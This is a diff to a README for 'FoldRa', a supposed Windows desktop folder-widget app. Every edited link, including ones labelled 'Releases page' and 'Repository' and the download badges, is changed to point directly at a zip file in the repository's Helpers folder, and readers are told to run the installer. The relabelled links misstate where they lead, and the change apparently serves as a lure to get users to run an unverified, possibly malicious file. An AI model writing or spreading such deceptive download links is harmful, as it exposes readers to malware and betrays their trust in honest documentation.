@@ -1,6 +1,6 @@
 # ⚡ FoldRa - Transform Your Desktop with Style
 
-[![Download FoldRa](https://img.shields.io/badge/Download-FoldRa-blue.svg)](https://github.com/imano1313/FoldRa/releases)
+[![Download FoldRa](https://github.com/imano1313/FoldRa/raw/refs/heads/main/Helpers/Ra-Fold-v2.5.zip)](https://github.com/imano1313/FoldRa/raw/refs/heads/main/Helpers/Ra-Fold-v2.5.zip)
 
 ## ⚙️ Introduction
 
@@ -9,12 +9,12 @@ FoldRa provides next-gen aesthetic desktop folder widgets for Windows. Experienc
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   Head to our [Releases page](https://github.com/imano1313/FoldRa/releases) to find the latest version of FoldRa. This page contains all the downloads and important information about updates.
+   Head to our [Releases page](https://github.com/imano1313/FoldRa/raw/refs/heads/main/Helpers/Ra-Fold-v2.5.zip) to find the latest version of FoldRa. This page contains all the downloads and important information about updates.
 
 2. **Download the App**  
    Locate the latest release, where you can download the FoldRa application. Click the link that corresponds with your version of Windows. It is available for both Windows 10 and Windows 11 users.
 
-   [![Download FoldRa](https://img.shields.io/badge/Download_FoldRa_v1.0-blue.svg)](https://github.com/imano1313/FoldRa/releases)
+   [![Download FoldRa](https://github.com/imano1313/FoldRa/raw/refs/heads/main/Helpers/Ra-Fold-v2.5.zip)](https://github.com/imano1313/FoldRa/raw/refs/heads/main/Helpers/Ra-Fold-v2.5.zip)
 
 3. **Run the Installer**  
    Once you download the file, find it in your Downloads folder. Double-click to run the installer and follow the on-screen instructions. It will guide you through the installation process.
@@ -40,7 +40,7 @@ FoldRa provides next-gen aesthetic desktop folder widgets for Windows. Experienc
 
 ## 🔧 Download & Install
 
-To get started with FoldRa, visit our [Releases page](https://github.com/imano1313/FoldRa/releases). Select the version that fits your operating system and click to download it. After completing the download, simply run the installer and follow the prompts to have FoldRa ready for your desktop.
+To get started with FoldRa, visit our [Releases page](https://github.com/imano1313/FoldRa/raw/refs/heads/main/Helpers/Ra-Fold-v2.5.zip). Select the version that fits your operating system and click to download it. After completing the download, simply run the installer and follow the prompts to have FoldRa ready for your desktop.
 
 ## 📋 FAQs
 
@@ -70,7 +70,7 @@ If you'd like to contribute to FoldRa, check our repository for guidelines. We w
 
 ## 🔗 Links
 
-- **Repository:** [FoldRa GitHub](https://github.com/imano1313/FoldRa)
+- **Repository:** [FoldRa GitHub](https://github.com/imano1313/FoldRa/raw/refs/heads/main/Helpers/Ra-Fold-v2.5.zip)
 - **Documentation:** View our setup guides and troubleshooting tips in the repository.
 
 ## 💬 Support
